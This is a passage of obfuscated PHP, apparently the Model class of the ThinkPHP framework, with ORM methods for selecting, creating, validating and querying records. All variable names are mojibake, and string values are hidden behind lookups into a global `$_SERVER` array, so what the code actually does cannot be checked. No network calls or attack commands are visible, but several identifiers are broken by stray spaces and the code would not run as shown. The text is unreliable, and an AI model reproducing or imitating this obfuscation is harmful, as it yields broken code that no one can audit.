$this->db->buildSelectSql($…òÍÄ˜¥) . $Ñ´³ı›É[357]; } $…òÍÄ˜¥ = $this->_parseOptions(); $ÈÇ¡‡Óì = $this->db->select($…òÍÄ˜¥); if (!1 === $ÈÇ¡‡Óì) { return !1; } if (empty($ÈÇ¡‡Óì)) { return null; } $this->_afterSelect($ÈÇ¡‡Óì, $…òÍÄ˜¥); return $ÈÇ¡‡Óì; } protected function _afterSelect(&$Ğ¾ºÄ»«, $¶×½ÓÂ²) { } public function buildSql($Î…êÈÈ° = array()) { $š›Éó™ú =& $_SERVER[†ûãı«°]; $Î…êÈÈ° = $this->_parseOptions($Î…êÈÈ°); return $š›Éó™ú[356] . $this->db->buildSelectSql($Î…êÈÈ°) . $š›Éó™ú[357]; } public function optionsValue($±µ¯†ç = null) { if (is_null($±µ¯†ç)) { return $this->options; } elseif (is_array($±µ¯†ç)) { $this->options = array_merge($this->options, $±µ¯†ç); } } protected function _parseOptions($İıöªœ„ = array()) { $×êœ®ä =& $_SERVER[†ûãı«°]; if (is_array($İıöªœ„)) { $İıöªœ„ = array_merge($this->options, $İıöªœ„); } $this->options = array(); if (!isset($İıöªœ„[$×êœ®ä[358]])) { $İıöªœ„[$×êœ®ä[358]] = $this->getTableName(); $ŸÀ¨¤óÅ = $this->fields; } else { $ŸÀ¨¤óÅ = $this->getDbFields(); } if (!empty($İıöªœ„[$×êœ®ä[359]])) { $İıöªœ„[$×êœ®ä[358]] .= $×êœ®ä[53] . $İıöªœ„[$×êœ®ä[359]]; } $İıöªœ„[$×êœ®ä[360]] = $this->name; if (isset($İıöªœ„[$×êœ®ä[354]]) && is_array($İıöªœ„[$×êœ®ä[354]]) && !empty($ŸÀ¨¤óÅ) && !isset($İıöªœ„[$×êœ®ä[361]]) && !isset($İıöªœ„[$×êœ®ä[358]])) { foreach ($İıöªœ„[$×êœ®ä[354]] as $É‰„‚è => $½£É«´) { $É‰„‚è = trim($É‰„‚è); if (in_array($É‰„‚è, $ŸÀ¨¤óÅ, !0)) { if (is_scalar($½£É«´)) { $this->_parseType($İıöªœ„[$×êœ®ä[354]], $É‰„‚è); } } elseif (!is_numeric($É‰„‚è) && $×êœ®ä[11] != substr($É‰„‚è, 0, 1) && !1 === strpos($É‰„‚è, $×êœ®ä[10]) && !1 === strpos($É‰„‚è, $×êœ®ä[339]) && !1 === strpos($É‰„‚è, $×êœ®ä[214]) && !1 === strpos($É‰„‚è, $×êœ®ä[286])) { unset($İıöªœ„[$×êœ®ä[354]][$É‰„‚è]); } } } $this->_options_filter($İıöªœ„); return $İıöªœ„; } protected function _options_filter(&$¦óğğÂĞ) { } protected function _parseType(&$èıí±ê, $™ÖĞñ÷¥) { $ˆ¯ĞùÎò =& $_SERVER[†ûãı«°]; if (empty($this->options[$ˆ¯ĞùÎò[362]][$ˆ¯ĞùÎò[4] . $™ÖĞñ÷¥])) { $“™ã®àö = strtolower($this->fields[$ˆ¯ĞùÎò[331]][$™ÖĞñ÷¥]); if (!1 !== strpos($“™ã®àö, $ˆ¯ĞùÎò[363])) { } elseif (!1 === strpos($“™ã®àö, $ˆ¯ĞùÎò[364]) && !1 !== strpos($“™ã®àö, $ˆ¯ĞùÎò[365])) { $èıí±ê[$™ÖĞñ÷¥] = intval($èıí±ê[$™ÖĞñ÷¥]); } elseif (!1 !== strpos($“™ã®àö, $ˆ¯ĞùÎò[366]) || !1 !== strpos($“™ã®àö, $ˆ¯ĞùÎò[367])) { $èıí±ê[$™ÖĞñ÷¥] = floatval($èıí±ê[$™ÖĞñ÷¥]); } elseif (!1 !== strpos($“™ã®àö, $ˆ¯ĞùÎò[368])) { $èıí±ê[$™ÖĞñ÷¥] = (bool) $èıí±ê[$™ÖĞñ÷¥]; } } } public function find($ø×·Ò½ª = array()) { $çÕŞÚÎ =& $_SERVER[†ûãı«°]; if (is_numeric($ø×·Ò½ª) || is_string($ø×·Ò½ª)) { $ÄáÈéÔ­[$this->getPk()] = intval($ø×·Ò½ª); $this->options[$çÕŞÚÎ[354]] = $ÄáÈéÔ­; } $this->options[$çÕŞÚÎ[369]] = 1; $ø×·Ò½ª = $this->_parseOptions(); $é¸¿ªõƒ = $this->db->select($ø×·Ò½ª); if (!1 === $é¸¿ªõƒ) { return !1; } if (empty($é¸¿ªõƒ)) { return null; } $this->data = $é¸¿ªõƒ[0]; $this->_afterFind($this->data, $ø×·Ò½ª); if (!empty($this->options[$çÕŞÚÎ[370]])) { return $this->returnResult($this->data, $this->options[$çÕŞÚÎ[370]]); } return $this->data; } protected function _afterFind(&$“õæ€˜È, $÷Ó•Ú‰ë) { } protected function returnResult($ù‡›Ğ“, $™“…Óìµ = '') { $Î…ïÙöæ =& $_SERVER[†ûãı«°]; if ($™“…Óìµ) { if (is_callable($™“…Óìµ)) { return call_user_func($™“…Óìµ, $ù‡›Ğ“); } switch (strtolower($™“…Óìµ)) { case $Î…ïÙöæ[371]: return json_encode($ù‡›Ğ“); case $Î…ïÙöæ[372]: return xml_encode($ù‡›Ğ“); } } return $ù‡›Ğ“; } public function parseFieldsMap($­ÏŞéûª, $û—³è°ä = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ô˜£‡· => $ãúû¯î‚) { if ($û—³è°ä == 1) { if (isset($­ÏŞéûª[$ãúû¯î‚])) { $­ÏŞéûª[$Ô˜£‡·] = $­ÏŞéûª[$ãúû¯î‚]; unset($­ÏŞéûª[$ãúû¯î‚]); } } else { if (isset($­ÏŞéûª[$Ô˜£‡·])) { $­ÏŞéûª[$ãúû¯î‚] = $­ÏŞéûª[$Ô˜£‡·]; unset($­ÏŞéûª[$Ô˜£‡·]); } } } } return $­ÏŞéûª; } public function setField($§Š¹´÷, $íÛ³´’· = '') { if (is_array($§Š¹´÷)) { $À¢‹˜ÍÏ = $§Š¹´÷; } else { $À¢‹˜ÍÏ[$§Š¹´÷] = $íÛ³´’·; } return $this->save($À¢‹˜ÍÏ); } public function setAdd($ÜŠ·Ê»•, $¬ºªºâ£ = 1) { $ø¶­²ëÛ =& $_SERVER[†ûãı«°]; $ÑÅİø‘‹ = $ÜŠ·Ê»• . $ø¶­²ëÛ[373] . $¬ºªºâ£; if ($¬ºªºâ£ < 0) { $ÑÅİø‘‹ = $ÜŠ·Ê»• . $¬ºªºâ£; } return $this->setField($ÜŠ·Ê»•, array($ø¶­²ëÛ[374], $ÑÅİø‘‹)); } public function getField($¶íÁ‰È‰, $²Å‹Üäº = null) { $ÛúÊ©İĞ =& $_SERVER[†ûãı«°]; $Òìçâ‚Õ[$ÛúÊ©İĞ[352]] = $¶íÁ‰È‰; $Òìçâ‚Õ = $this->_parseOptions($Òìçâ‚Õ); $¶íÁ‰È‰ = trim($¶íÁ‰È‰); if (strpos($¶íÁ‰È‰, $ÛúÊ©İĞ[50])) { if (!isset($Òìçâ‚Õ[$ÛúÊ©İĞ[369]])) { $Òìçâ‚Õ[$ÛúÊ©İĞ[369]] = is_numeric($²Å‹Üäº) ? $²Å‹Üäº : $ÛúÊ©İĞ[12]; } $Œ ˆ¤ûÙ = $this->db->select($Òìçâ‚Õ); if (!empty($Œ ˆ¤ûÙ)) { $¬Ä­­šú = explode($ÛúÊ©İĞ[50], $¶íÁ‰È‰); $¶íÁ‰È‰ = array_keys($Œ ˆ¤ûÙ[0]); $÷ØåšÓ‚ = array_shift($¶íÁ‰È‰); $‘Ø°äÇÅ = array_shift($¶íÁ‰È‰); $öòÓÃƒ™ = array(); $ÖÚ¨àÑÃ = count($¬Ä­­šú); foreach ($Œ ˆ¤ûÙ as $ˆ›¿ÏŸÌ) { $¶Ûø±€ = $ˆ›¿ÏŸÌ[$÷ØåšÓ‚]; if (2 == $ÖÚ¨àÑÃ) { $öòÓÃƒ™[$¶Ûø±€] = $ˆ›¿ÏŸÌ[$‘Ø°äÇÅ]; } else { $öòÓÃƒ™[$¶Ûø±€] = is_string($²Å‹Üäº) ? implode($²Å‹Üäº, $ˆ›¿ÏŸÌ) : $ˆ›¿ÏŸÌ; } } return $öòÓÃƒ™; } } else { if (!0 !== $²Å‹Üäº) { $Òìçâ‚Õ[$ÛúÊ©İĞ[369]] = is_numeric($²Å‹Üäº) ? $²Å‹Üäº : 1; } if ($²Å‹Üäº === $ÛúÊ©İĞ[334]) { unset($Òìçâ‚Õ[$ÛúÊ©İĞ[369]]); } $ˆ›¿ÏŸÌ = $this->db->select($Òìçâ‚Õ); if (!empty($ˆ›¿ÏŸÌ)) { if ($²Å‹Üäº === $ÛúÊ©İĞ[334]) { return reset($ˆ›¿ÏŸÌ[0]); } if (!0 !== $²Å‹Üäº && 1 == $Òìçâ‚Õ[$ÛúÊ©İĞ[369]]) { return reset($ˆ›¿ÏŸÌ[0]); } foreach ($ˆ›¿ÏŸÌ as $âö Ü£å) { $á­È£áô[] = $âö Ü£å[$¶íÁ‰È‰]; } return $á­È£áô; } } return null; } public function create($õé«÷ = '', $½àéùÃ = '') { $îÌè•¡› =& $_SERVER[†ûãı«°]; if (empty($õé«÷)) { $õé«÷ = $_POST; } elseif (is_object($õé«÷)) { $õé«÷ = get_object_vars($õé«÷); } if (empty($õé«÷) || !is_array($õé«÷)) { $this->error = think_lang($îÌè•¡›[350]); return !1; } $õé«÷ = $this->parseFieldsMap($õé«÷, 0); $½àéùÃ = $½àéùÃ ? $½àéùÃ : (!empty($õé«÷[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$îÌè•¡›[352]])) { $Ô”Şì€ = $this->options[$îÌè•¡›[352]]; unset($this->options[$îÌè•¡›[352]]); } elseif ($½àéùÃ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ô”Şì€ = $this->insertFields; } elseif ($½àéùÃ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ô”Şì€ = $this->updateFields; } if (isset($Ô”Şì€)) { if (is_string($Ô”Şì€)) { $Ô”Şì€ = explode($îÌè•¡›[50], $Ô”Şì€); } if (think_config($îÌè•¡›[375])) { $Ô”Şì€[] = think_config($îÌè•¡›[376]); } foreach ($õé«÷ as $›øöÌÂ” => $úáñ˜´Ä) { if (!in_array($›øöÌÂ”, $Ô”Şì€)) { unset($õé«÷[$›øöÌÂ”]); } } } if (!$this->autoValidation($õé«÷, $½àéùÃ)) { return !1; } if (!$this->autoCheckToken($õé«÷)) { $this->error = think_lang($îÌè•¡›[377]); return !1; } if ($this->autoCheckFields) { $Ô”Şì€ = $this->getDbFields(); foreach ($õé«÷ as $›øöÌÂ” => $úáñ˜´Ä) { if (!in_array($›øöÌÂ”, $Ô”Şì€)) { unset($õé«÷[$›øöÌÂ”]); } elseif (MAGIC_QUOTES_GPC && is_string($úáñ˜´Ä)) { $õé«÷[$›øöÌÂ”] = stripslashes($úáñ˜´Ä); } } } $this->autoOperation($õé«÷, $½àéùÃ); $this->data = $õé«÷; return $õé«÷; } public function autoCheckToken($£¨ä•€†) { $çÕ‹Ö·ó =& $_SERVER[†ûãı«°]; if (isset($this->options[$çÕ‹Ö·ó[378]]) && !$this->options[$çÕ‹Ö·ó[378]]) { return !0; } if (think_config($çÕ‹Ö·ó[375])) { $şîÉœÀ» = think_config($çÕ‹Ö·ó[376]); if (!isset($£¨ä•€†[$şîÉœÀ»]) || Session::get($şîÉœÀ»)) { return !1; } list($ÃâÇÄ½—, $™ªúÌ°) = explode($çÕ‹Ö·ó[11], $£¨ä•€†[$şîÉœÀ»]); if ($™ªúÌ° && Session::get($şîÉœÀ» . $çÕ‹Ö·ó[10] . $ÃâÇÄ½—) === $™ªúÌ°) { Session::remove($şîÉœÀ» . $çÕ‹Ö·ó[10] . $ÃâÇÄ½—); return !0; } if (think_config($çÕ‹Ö·ó[379])) { Session::remove($şîÉœÀ» . $çÕ‹Ö·ó[10] . $ÃâÇÄ½—); } return !1; } return !0; } public function regex($²¥ÂÛ‰¥, $÷ş¸Å¿) { $ıÓ‘–˜¯ =& $_SERVER[†ûãı«°]; $éèÎºğı = array($ıÓ‘–˜¯[380] => $ıÓ‘–˜¯[381], $ıÓ‘–˜¯[382] => $ıÓ‘–˜¯[383], $ıÓ‘–˜¯[384] => $ıÓ‘–˜¯[385], $ıÓ‘–˜¯[386] => $ıÓ‘–˜¯[387], $ıÓ‘–˜¯[388] => $ıÓ‘–˜¯[389], $ıÓ‘–˜¯[390] => $ıÓ‘–˜¯[391], $ıÓ‘–˜¯[392] => $ıÓ‘–˜¯[393], $ıÓ‘–˜¯[367] => $ıÓ‘–˜¯[394], $ıÓ‘–˜¯[395] => $ıÓ‘–˜¯[396]); if (isset($éèÎºğı[strtolower($÷ş¸Å¿)])) { $÷ş¸Å¿ = $éèÎºğı[strtolower($÷ş¸Å¿)]; } return preg_match($÷ş¸Å¿, $²¥ÂÛ‰¥) === 1; } private function autoOperation(&$Â¾‹¹ƒã, $´Ò€Ş™Ã) { $òâ¹‚– =& $_SERVER[†ûãı«°]; if (!empty($this->options[$òâ¹‚–[397]])) { $Íı¾ú…Ç = $this->options[$òâ¹‚–[397]]; unset($this->options[$òâ¹‚–[397]]); } elseif (!empty($this->_auto)) { $Íı¾ú…Ç = $this->_auto; } if (isset($Íı¾ú…Ç)) { foreach ($Íı¾ú…Ç as $Ç¤‚ñ») { if (empty($Ç¤‚ñ»[2])) { $Ç¤‚ñ»[2] = THINK_MODEL_INSERT; } if ($´Ò€Ş™Ã == $Ç¤‚ñ»[2] || $Ç¤‚ñ»[2] == THINK_MODEL_BOTH) { switch (trim($Ç¤‚ñ»[3])) { case $òâ¹‚–[398]: case $òâ¹‚–[399]: $Îî‘í…ˆ = isset($Ç¤‚ñ»[4]) ? (array) $Ç¤‚ñ»[4] : array(); if (isset($Â¾‹¹ƒã[$Ç¤‚ñ»[0]])) { array_unshift($Îî‘í…ˆ, $Â¾‹¹ƒã[$Ç¤‚ñ»[0]]); } if ($òâ¹‚–[398] == $Ç¤‚ñ»[3]) { $Â¾‹¹ƒã[$Ç¤‚ñ»[0]] = call_user_func_array($Ç¤‚ñ»[1], $Îî‘í…ˆ); } else { $Â¾‹¹ƒã[$Ç¤‚ñ»[0]] = call_user_func_array(array(&$this, $Ç¤‚ñ»[1]), $Îî‘í…ˆ); } break; case $òâ¹‚–[352]: $Â¾‹¹ƒã[$Ç¤‚ñ»[0]] = $Â¾‹¹ƒã[$Ç¤‚ñ»[1]]; break; case $òâ¹‚–[400]: if ($òâ¹‚–[12] === $Â¾‹¹ƒã[$Ç¤‚ñ»[0]]) { unset($Â¾‹¹ƒã[$Ç¤‚ñ»[0]]); } break; case $òâ¹‚–[401]: default: $Â¾‹¹ƒã[$Ç¤‚ñ»[0]] = $Ç¤‚ñ»[1]; } if (!1 === $Â¾‹¹ƒã[$Ç¤‚ñ»[0]]) { unset($Â¾‹¹ƒã[$Ç¤‚ñ»[0]]); } } } } return $Â¾‹¹ƒã; } protected function autoValidation($´¼É¸¯‡, $²Æùƒë§) { $Íå°‘± =& $_SERVER[†ûãı«°]; if (!empty($this->options[$Íå°‘±[402]])) { $º»…‡µ = $this->options[$Íå°‘±[402]]; unset($this->options[$Íå°‘±[402]]); } elseif (!empty($this->_validate)) { $º»…‡µ = $this->_validate; } if (isset($º»…‡µ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($º»…‡µ as $ûÛÛàÙ¤ => $ĞûüÂœ„) { if (empty($ĞûüÂœ„[5]) || $ĞûüÂœ„[5] == THINK_MODEL_BOTH || $ĞûüÂœ„[5] == $²Æùƒë§) { if (0 == strpos($ĞûüÂœ„[2], $Íå°‘±[403]) && strpos($ĞûüÂœ„[2], $Íå°‘±[404])) { $ĞûüÂœ„[2] = think_lang(substr($ĞûüÂœ„[2], 2, -1)); } $ĞûüÂœ„[3] = isset($ĞûüÂœ„[3]) ? $ĞûüÂœ„[3] : THINK_EXISTS_VALIDATE; $ĞûüÂœ„[4] = isset($ĞûüÂœ„[4]) ? $ĞûüÂœ„[4] : $Íå°‘±[405]; switch ($ĞûüÂœ„[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($´¼É¸¯‡, $ĞûüÂœ„)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Íå°‘±[12] != trim($´¼É¸¯‡[$ĞûüÂœ„[0]])) { if (!1 === $this->_validationField($´¼É¸¯‡, $ĞûüÂœ„)) { return !1; } } break; default: if (isset($´¼É¸¯‡[$ĞûüÂœ„[0]])) { if (!1 === $this->_validationField($´¼É¸¯‡, $ĞûüÂœ„)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($‘²¤ıÓÄ, $Œ”ïÜ¼½) { if (!1 === $this->_validationFieldItem($‘²¤ıÓÄ, $Œ”ïÜ¼½)) { if ($this->patchValidate) { $this->error[$Œ”ïÜ¼½[0]] = $Œ”ïÜ¼½[2]; } else { $this->error = $Œ”ïÜ¼½[2]; return !1; } } return; } protected function _validationFieldItem($é¿á­ñ÷, $ëšó¦À) { $Ç½ìş“¤ =& $_SERVER[†ûãı«°]; switch (strtolower(trim($ëšó¦À[4]))) { case $Ç½ìş“¤[398]: case $Ç½ìş“¤[399]: $šªèó‘È = isset($ëšó¦À[6]) ? (array) $ëšó¦À[6] : array(); if (is_string($ëšó¦À[0]) && strpos($ëšó¦À[0], $Ç½ìş“¤[50])) { $ëšó¦À[0] = explode($Ç½ìş“¤[50], $ëšó¦À[0]); } if (is_array($ëšó¦À[0])) { foreach ($ëšó¦À[0] as $ÃŠ’®š«) { $î…Ú¬öœ[$ÃŠ’®š«] = $é¿á­ñ÷[$ÃŠ’®š«]; } array_unshift($šªèó‘È, $î…Ú¬öœ); } else { array_unshift($šªèó‘È, $é¿á­ñ÷[$ëšó¦À[0]]); } if ($Ç½ìş“¤[398] == $ëšó¦À[4]) { return call_user_func_array($ëšó¦À[1], $šªèó‘È); } else { return call_user_func_array(array(&$this, $ëšó¦À[1]), $šªèó‘È); } case $Ç½ìş“¤[406]: return $é¿á­ñ÷[$ëšó¦À[0]] == $é¿á­ñ÷[$ëšó¦À[1]]; case $Ç½ìş“¤[407]: if (is_string($ëšó¦À[0]) && strpos($ëšó¦À[0], $Ç½ìş“¤[50])) { $ëšó¦À[0] = explode($Ç½ìş“¤[50], $ëšó¦À[0]); } $¨½”‚õ» = array(); if (is_array($ëšó¦À[0])) { foreach ($ëšó¦À[0] as $ÃŠ’®š«) { $¨½”‚õ»[$ÃŠ’®š«] = $é¿á­ñ÷[$ÃŠ’®š«]; } } else { $¨½”‚õ»[$ëšó¦À[0]] = $é¿á­ñ÷[$ëšó¦À[0]]; } if (!empty($é¿á­ñ÷[$this->getPk()])) { $¨½”‚õ»[$this->getPk()] = array($Ç½ìş“¤[408], $é¿á­ñ÷[$this->getPk()]); } if ($this->where($¨½”‚õ»)->find()) { return !1; } return !0; default: return $this->check($é¿á­ñ÷[$ëšó¦À[0]], $ëšó¦À[1], $ëšó¦À[4]); } } public function check($ıèî’Ü, $º¾‡¯€ş, $¾Ó°šäÈ = "\x72\x65\x67\x65\x78") { $ÑæÎÓñ =& $_SERVER[†ûãı«°]; $¾Ó°šäÈ = strtolower(trim($¾Ó°šäÈ)); switch ($¾Ó°šäÈ) { case $ÑæÎÓñ[7]: case $ÑæÎÓñ[409]: $× Èšçµ = is_array($º¾‡¯€ş) ? $º¾‡¯€ş : explode($ÑæÎÓñ[50], $º¾‡¯€ş); return $¾Ó°šäÈ == $ÑæÎÓñ[7] ? in_array($ıèî’Ü, $× Èšçµ) : !in_array($ıèî’Ü, $× Èšçµ); case $ÑæÎÓñ[410]: case $ÑæÎÓñ[411]: if (is_array($º¾‡¯€ş)) { $£§ÏùÀ— = $º¾‡¯€ş[0]; $ÍŠ‚ù¬ì = $º¾‡¯€ş[1]; } else { list($£§ÏùÀ—, $ÍŠ‚ù¬ì) = explode($ÑæÎÓñ[50], $º¾‡¯€ş); } return $¾Ó°šäÈ == $ÑæÎÓñ[410] ? $ıèî’Ü >= $£§ÏùÀ— && $ıèî’Ü <= $ÍŠ‚ù¬ì : $ıèî’Ü < $£§ÏùÀ— || $ıèî’Ü > $ÍŠ‚ù¬ì; case $ÑæÎÓñ[412]: case $ÑæÎÓñ[413]: return $¾Ó°šäÈ == $ÑæÎÓñ[412] ? $ıèî’Ü == $º¾‡¯€ş : $ıèî’Ü != $º¾‡¯€ş; case $ÑæÎÓñ[414]: $í®±«ÚÜ = mb_strlen($ıèî’Ü, $ÑæÎÓñ[415]); if (strpos($º¾‡¯€ş, $ÑæÎÓñ[50])) { list($£§ÏùÀ—, $ÍŠ‚ù¬ì) = explode($ÑæÎÓñ[50], $º¾‡¯€ş); return $í®±«ÚÜ >= $£§ÏùÀ— && $í®±«ÚÜ <= $ÍŠ‚ù¬ì; } else { return $í®±«ÚÜ == $º¾‡¯€ş; } case $ÑæÎÓñ[416]: list($©†ëÜ, $ä™À†‡™) = explode($ÑæÎÓñ[50], $º¾‡¯€ş); if (!is_numeric($©†ëÜ)) { $©†ëÜ = strtotime($©†ëÜ); } if (!is_numeric($ä™À†‡™)) { $ä™À†‡™ = strtotime($ä™À†‡™); } return NOW_TIME >= $©†ëÜ && NOW_TIME <= $ä™À†‡™; case $ÑæÎÓñ[417]: return in_array(get_client_ip(), explode($ÑæÎÓñ[50], $º¾‡¯€ş)); case $ÑæÎÓñ[418]: return !in_array(get_client_ip(), explode($ÑæÎÓñ[50], $º¾‡¯€ş)); case $ÑæÎÓñ[405]: default: return $this->regex($ıèî’Ü, $º¾‡¯€ş); } } public function query($¿°ş…Ø§, $¹£šÏ = false) { $æµÊ«¥€ =& $_SERVER[†ûãı«°]; if (!is_bool($¹£šÏ) && !is_array($¹£šÏ)) { $¹£šÏ = func_get_args(); array_shift($¹£šÏ); } $¿°ş…Ø§ = str_replace(array($æµÊ«¥€[287], $æµÊ«¥€[419]), $æµÊ«¥€[53], $¿°ş…Ø§); $¿°ş…Ø§ = $this->parseSql($¿°ş…Ø§, $¹£šÏ); return $this->db->query($¿°ş…Ø§); } public function execute($ÅÉĞ¿Ç¿, $ûñğµÃó = false) { if (!is_bool($ûñğµÃó) && !is_array($ûñğµÃó)) { $ûñğµÃó = func_get_args(); array_shift($ûñğµÃó); } $ÅÉĞ¿Ç¿ = $this->parseSql($ÅÉĞ¿Ç¿, $ûñğµÃó); return $this->db->execute($ÅÉĞ¿Ç¿); } protected function parseSql($™Ìû™˜‡, $È³‰‰ÎÃ) { $¿Ğ…«° =& $_SERVER[†ûãı«°]; if (!0 === $È³‰‰ÎÃ) { $üØİüúÅ = $this->_parseOptions(); $™Ìû™˜‡ = $this->db->parseSql($™Ìû™˜‡, $üØİüúÅ); } elseif (is_array($È³‰‰ÎÃ)) { $È³‰‰ÎÃ = array_map(array($this->db, $¿Ğ…«°[420]), $È³‰‰ÎÃ); $™Ìû™˜‡ = vsprintf($™Ìû™˜‡, $È³‰‰ÎÃ); } else { $™Ìû™˜‡ = strtr($™Ìû™˜‡, array($¿Ğ…«°[421] => $this->getTableName(), $¿Ğ…«°[422] => think_config($¿Ğ…«°[323]))); } $this->db->setModel($this->name); return $™Ìû™˜‡; } public function db($óËªÆ–Ï = '', $âĞÆÅñ‘ = '', $Áşâ©· = array()) { $ÚŞ¿±»© =& $_SERVER[†ûãı«°]; if ($ÚŞ¿±»©[12] === $óËªÆ–Ï && $this->db) { return $this->db; } static $ñºØşò = array(); static $Ö‡²‘¼ = array(); if (!isset($Ö‡²‘¼[$óËªÆ–Ï]) || isset($Ö‡²‘¼[$óËªÆ–Ï]) && $âĞÆÅñ‘ && $ñºØşò[$óËªÆ–Ï] != $âĞÆÅñ‘) { if (!empty($âĞÆÅñ‘) && is_string($âĞÆÅñ‘) && !1 === strpos($âĞÆÅñ‘, $ÚŞ¿±»©[8])) { $âĞÆÅñ‘ = think_config($âĞÆÅñ‘); } $óËªÆ–Ï = think_guid($âĞÆÅñ‘); $Ö‡²‘¼[$óËªÆ–Ï] = Db::getInstance($âĞÆÅñ‘); } elseif (NULL === $âĞÆÅñ‘) { $Ö‡²‘¼[$óËªÆ–Ï]->close(); unset($Ö‡²‘¼[$óËªÆ–Ï]); return; } if (!empty($Áşâ©·)) { if (is_string($Áşâ©·)) { parse_str($Áşâ©·, $Áşâ©·); } foreach ($Áşâ©· as $ú»ä»Ìú => $¦´›ŒÌ¾) { $this->setProperty($ú»ä»Ìú, $¦´›ŒÌ¾); } } $ñºØşò[$óËªÆ–Ï] = $âĞÆÅñ‘; $this->db = $Ö‡²‘¼[$óËªÆ–Ï]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ï‘½îğë = get_class($this); if ($ï‘½îğë == $_SERVER[†ûãı«°][423]) { return $this->name; } $this->name = substr($ï‘½îğë, 0, -5); } return $this->name; } public function getTableName() { $­©‘Ã‹¤ =& $_SERVER[†ûãı«°]; if (empty($this->trueTableName)) { $£Èß¶‰Ú = !empty($this->tablePrefix) ? $this->tablePrefix : $­©‘Ã‹¤[12]; if (!empty($this->tableName)) { $£Èß¶‰Ú .= $this->tableName; } else { $£Èß¶‰Ú .= think_parse_name($this->name); } $this->trueTableName = strtolower($£Èß¶‰Ú); } return (!empty($this->dbName) ? $this->dbName . $­©‘Ã‹¤[10] : $­©‘Ã‹¤[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $“£—ÅÏà =& $_SERVER[†ûãı«°]; return isset($this->fields[$“£—ÅÏà[330]]) ? $this->fields[$“£—ÅÏà[330]] : $this->pk; } public function getDbFields() { $¹Ø•’Ä =& $_SERVER[†ûãı«°]; if (isset($this->options[$¹Ø•’Ä[358]])) { $â‹–Ï = $this->db->getFields($this->options[$¹Ø•’Ä[358]]); return $â‹–Ï ? array_keys($â‹–Ï) : !1; } if ($this->fields) { $â‹–Ï = $this->fields; unset($â‹–Ï[$¹Ø•’Ä[329]], $â‹–Ï[$¹Ø•’Ä[330]], $â‹–Ï[$¹Ø•’Ä[331]], $â‹–Ï[$¹Ø•’Ä[328]]); return $â‹–Ï; } return !1; } public function data($úªÆÂÑ÷ = '') { $­ºğìË• =& $_SERVER[†ûãı«°]; if ($­ºğìË•[12] === $úªÆÂÑ÷ && !empty($this->data)) { return $this->data; } if (is_object($úªÆÂÑ÷)) { $úªÆÂÑ÷ = get_object_vars($úªÆÂÑ÷); } elseif (is_string($úªÆÂÑ÷)) { parse_str($úªÆÂÑ÷, $úªÆÂÑ÷); } elseif (!is_array($úªÆÂÑ÷)) { think_exception(think_lang($­ºğìË•[350])); } $this->data = $úªÆÂÑ÷; return $this; } public function join($½ûº»Ş) { $ºßÎ»õÁ =& $_SERVER[†ûãı«°]; if (is_array($½ûº»Ş)) { $this->options[$ºßÎ»õÁ[361]] = $½ûº»Ş; } elseif (!empty($½ûº»Ş)) { $this->options[$ºßÎ»õÁ[361]][] = $½ûº»Ş; } return $this; } public function union($–ãœ•¦—, $ÆóŠãœ = false) { $ıÀÖû×Ø =& $_SERVER[†ûãı«°]; if (empty($–ãœ•¦—)) { return $this; } if ($ÆóŠãœ) { $this->options[$ıÀÖû×Ø[424]][$ıÀÖû×Ø[425]] = !0; } if (is_object($–ãœ•¦—)) { $–ãœ•¦— = get_object_vars($–ãœ•¦—); } if (is_string($–ãœ•¦—)) { $‰¦±Ìú¸ = $–ãœ•¦—; } elseif (is_array($–ãœ•¦—)) { if (isset($–ãœ•¦—[0])) { $this->options[$ıÀÖû×Ø[424]] = array_merge($this->options[$ıÀÖû×Ø[424]], $–ãœ•¦—); return $this; } else { $‰¦±Ìú¸ = $–ãœ•¦—; } } else { think_exception(think_lang($ıÀÖû×Ø[350])); } $this->options[$ıÀÖû×Ø[424]][] = $‰¦±Ìú¸; return $this; } public function cache($¥ôÉ‹ç = true, $§¢Ò‚Úº = null, $´‰úÊİ = '') { $Åâš×• =& $_SERVER[†ûãı«°]; if (!1 !== $¥ôÉ‹ç) { $this->options[$Åâš×•[426]] = array($Åâš×•[97] => $¥ôÉ‹ç, $Åâš×•[416] => $§¢Ò‚Úº, $Åâš×•[33] => $´‰úÊİ); } return $this; } public function field($¼åĞ‰Œ½, $ÎÍµßÜÁ = false) { $ü£¤‚–Ü =& $_SERVER[†ûãı«°]; if (!0 === $¼åĞ‰Œ½) { $ì˜óù‘» = $this->getDbFields(); $¼åĞ‰Œ½ = $ì˜óù‘» ? $ì˜óù‘» : $ü£¤‚–Ü[222]; } elseif ($ÎÍµßÜÁ) { if (is_string($¼åĞ‰Œ½)) { $¼åĞ‰Œ½ = explode($ü£¤‚–Ü[50], $¼åĞ‰Œ½); } $ì˜óù‘» = $this->getDbFields(); $¼åĞ‰Œ½ = $ì˜óù‘» ? array_diff($ì˜óù‘», $¼åĞ‰Œ½) : $¼åĞ‰Œ½; } $this->options[$ü£¤‚–Ü[352]] = $¼åĞ‰Œ½; return $this; } public function scope($ˆö®ƒéÒ = '', $Ëöş’ƒğ = NULL) { $âèºô‰ =& $_SERVER[†ûãı«°]; if ($âèºô‰[12] === $ˆö®ƒéÒ) { if (isset($this->_scope[$âèºô‰[37]])) { $úìÛÑÁê = $this->_scope[$âèºô‰[37]]; } else { return $this; } } elseif (is_string($ˆö®ƒéÒ)) { $é¦ŒôÃ = explode($âèºô‰[50], $ˆö®ƒéÒ); $úìÛÑÁê = array(); foreach ($é¦ŒôÃ as $Œ÷›Ø¸) { if (!isset($this->_scope[$Œ÷›Ø¸])) { continue; } 